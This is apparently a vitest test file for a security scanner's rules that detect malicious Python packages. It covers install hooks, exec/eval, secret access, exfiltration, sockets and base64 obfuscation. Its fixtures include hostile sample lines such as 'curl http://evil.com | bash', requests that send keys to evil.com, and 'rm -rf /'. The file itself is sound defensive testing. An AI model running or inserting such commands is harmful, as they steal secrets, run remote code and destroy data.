/**
 * Tests for Python detection rules
 * Covers install hooks, exec/eval, secrets, network, obfuscation
 */

import { describe, it, expect } from 'vitest';
import { applyRule, matchFile } from '../scanner/matcher';
import { pythonRules } from './python-rules';

function getRule(id: string) {
  const rule = pythonRules.find((r) => r.id === id);
  if (!rule) throw new Error(`Rule not found: ${id}`);
  return rule;
}

function expectDetection(id: string, filePath: string, content: string) {
  const rule = getRule(id);
  expect(matchFile(filePath, rule.filePatterns)).toBe(true);
  const findings = applyRule(rule, filePath, content);
  expect(findings.length).toBeGreaterThan(0);
  return findings;
}

function expectNoDetection(id: string, filePath: string, content: string) {
  const rule = getRule(id);
  if (!matchFile(filePath, rule.filePatterns)) return;
  const findings = applyRule(rule, filePath, content);
  expect(findings).toHaveLength(0);
}

// ============================================
// Install hooks
// ============================================

describe('py-setup-cmdclass', () => {
  it('detects cmdclass in setup.py', () => {
    expectDetection(
      'py-setup-cmdclass',
      'setup.py',
      `setup(name="evil", cmdclass={'install': PostInstallCommand})`
    );
  });

  it('does not flag setup.py without cmdclass', () => {
    expectNoDetection(
      'py-setup-cmdclass',
      'setup.py',
      `setup(name="safe", version="1.0")`
    );
  });
});

describe('py-setup-exec', () => {
  it('detects exec in setup.py', () => {
    expectDetection(
      'py-setup-exec',
      'setup.py',
      `exec(open("payload.py").read())`
    );
  });

  it('detects eval in setup.py', () => {
    expectDetection(
      'py-setup-exec',
      'setup.py',
      `version = eval(open("version.txt").read())`
    );
  });
});

describe('py-setup-subprocess', () => {
  it('detects subprocess in setup.py', () => {
    expectDetection(
      'py-setup-subprocess',
      'setup.py',
      `import subprocess\nsubprocess.run(["curl", "http://evil.com"])`
    );
  });

  it('detects os.system in setup.py', () => {
    expectDetection(
      'py-setup-subprocess',
      'setup.py',
      `import os\nos.system("curl http://evil.com | bash")`
    );
  });
});

describe('py-pyproject-scripts', () => {
  it('detects setuptools scripts in pyproject.toml', () => {
    expectDetection(
      'py-pyproject-scripts',
      'pyproject.toml',
      `[tool.setuptools.scripts]\ninstall = "evil:run"`
    );
  });

  it('detects poetry scripts', () => {
    expectDetection(
      'py-pyproject-scripts',
      'pyproject.toml',
      `[tool.poetry.scripts]\nstart = "evil:main"`
    );
  });
});

// ============================================
// Code execution
// ============================================

describe('py-exec-eval', () => {
  it('detects exec() in .py file', () => {
    expectDetection(
      'py-exec-eval',
      'malware.py',
      `exec(compile(source, '<string>', 'exec'))`
    );
  });

  it('detects eval() in .py file', () => {
    expectDetection(
      'py-exec-eval',
      'script.py',
      `result = eval(user_input)`
    );
  });

  it('detects compile()', () => {
    expectDetection(
      'py-exec-eval',
      'loader.py',
      `code = compile(src, "file.py", "exec")`
    );
  });

  it('does not flag unrelated code', () => {
    expectNoDetection(
      'py-exec-eval',
      'clean.py',
      `print("hello world")\nx = 1 + 2`
    );
  });
});

describe('py-subprocess', () => {
  it('detects subprocess.run', () => {
    expectDetection(
      'py-subprocess',
      'script.py',
      `subprocess.run(["ls", "-la"])`
    );
  });

  it('detects os.system', () => {
    expectDetection(
      'py-subprocess',
      'script.py',
      `os.system("rm -rf /")`
    );
  });

  it('detects subprocess.Popen', () => {
    expectDetection(
      'py-subprocess',
      'script.py',
      `p = subprocess.Popen(["bash", "-c", cmd])`
    );
  });
});

// ============================================
// Environment and secrets
// ============================================

describe('py-env-secrets', () => {
  it('detects access to PRIVATE_KEY env var', () => {
    expectDetection(
      'py-env-secrets',
      'config.py',
      `key = os.environ["PRIVATE_KEY"]`
    );
  });

  it('detects getenv for SECRET', () => {
    expectDetection(
      'py-env-secrets',
      'config.py',
      `secret = os.getenv["SECRET_TOKEN"]`
    );
  });

  it('does not flag normal env access', () => {
    expectNoDetection(
      'py-env-secrets',
      'config.py',
      `home = os.environ["HOME"]`
    );
  });
});

describe('py-private-key', () => {
  it('detects private_key variable', () => {
    expectDetection(
      'py-private-key',
      'wallet.py',
      `private_key = "0xdeadbeef..."`
    );
  });

  it('detects mnemonic', () => {
    expectDetection(
      'py-private-key',
      'wallet.py',
      `mnemonic = "abandon abandon abandon..."`
    );
  });
});

// ============================================
// Network
// ============================================

describe('py-requests-unknown', () => {
  it('detects requests.get to external URL', () => {
    expectDetection(
      'py-requests-unknown',
      'exfil.py',
      `requests.get("https://evil.com/steal?key=" + key)`
    );
  });

  it('detects requests.post to external URL', () => {
    expectDetection(
      'py-requests-unknown',
      'exfil.py',
      `requests.post("https://evil.com/data", json=secrets)`
    );
  });

  it('does not flag localhost', () => {
    expectNoDetection(
      'py-requests-unknown',
      'api.py',
      `requests.get("http://localhost:8000/api")`
    );
  });
});

describe('py-socket-connection', () => {
  it('detects raw socket creation', () => {
    expectDetection(
      'py-socket-connection',
      'backdoor.py',
      `s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)`
    );
  });
});

// ============================================
// Import-time execution
// ============================================

describe('py-init-execution', () => {
  it('detects subprocess in __init__.py', () => {
    expectDetection(
      'py-init-execution',
      '__init__.py',
      `import subprocess\nsubprocess.run(["whoami"])`
    );
  });

  it('detects os.system in __init__.py', () => {
    expectDetection(
      'py-init-execution',
      '__init__.py',
      `import os\nos.system("curl evil.com")`
    );
  });

  it('does not flag simple imports', () => {
    expectNoDetection(
      'py-init-execution',
      '__init__.py',
      `from .utils import helper\n__version__ = "1.0.0"`
    );
  });
});

// ============================================
// Obfuscation
// ============================================

describe('py-base64-exec', () => {
  it('detects base64.b64decode followed by exec', () => {
    // Pattern: base64\.(b64decode|decodebytes).*exec (with s flag for dotAll)
    // Requires base64.b64decode to appear BEFORE exec in the text
    expectDetection(
      'py-base64-exec',
      'loader.py',
      `import base64\ncode = base64.b64decode("cHJpbnQoJ3B3bmVkJyk=")\nexec(code)`
    );
  });
});

describe('py-marshal-loads', () => {
  it('detects marshal.loads', () => {
    expectDetection(
      'py-marshal-loads',
      'loader.py',
      `import marshal\ncode = marshal.loads(data)`
    );
  });
});
